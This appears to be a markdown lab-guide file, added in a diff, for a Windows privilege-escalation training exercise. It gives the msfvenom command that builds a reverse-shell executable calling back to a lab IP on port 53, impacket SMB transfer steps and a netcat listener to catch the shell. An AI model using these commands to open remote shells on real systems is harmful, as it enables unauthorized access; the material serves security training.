@@ -1,0 +1,35 @@
+# Task 2: Generating a Reverse Shell with msfvenom 💻🔄
+
+## Description
+In this task, you need to generate a reverse shell executable (`reverse.exe`) on Kali using **msfvenom**. Be sure to update the LHOST IP address to match your configuration. 🌐
+
+---
+
+### Command to Generate the Shell: 
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
+
+---
+
+## Transferring `reverse.exe` to Windows
+After creating the file, you need to transfer `reverse.exe` to the `C:\PrivEsc` directory on Windows. There are several methods to achieve this, but the simplest is to start an SMB server on Kali in the same directory as the file and then use a standard copy command on Windows.
+
+---
+
+### Steps to Transfer the File:
+1. On Kali, in the same directory as `reverse.exe`: 
+   `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+2. On Windows (replace the IP address with your Kali IP): 
+   `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
+
+---
+
+## Testing the Reverse Shell 🔍
+1. Set up a **Netcat** listener on Kali to test the reverse shell: 
+   `sudo nc -nvlp 53`
+2. Execute `reverse.exe` on Windows and catch the shell: 
+   `C:\PrivEsc\reverse.exe`
+
+---
+
+### Important! ⚠️
+The `reverse.exe` file will be used in many tasks throughout this room, so do not delete it! 🗑️
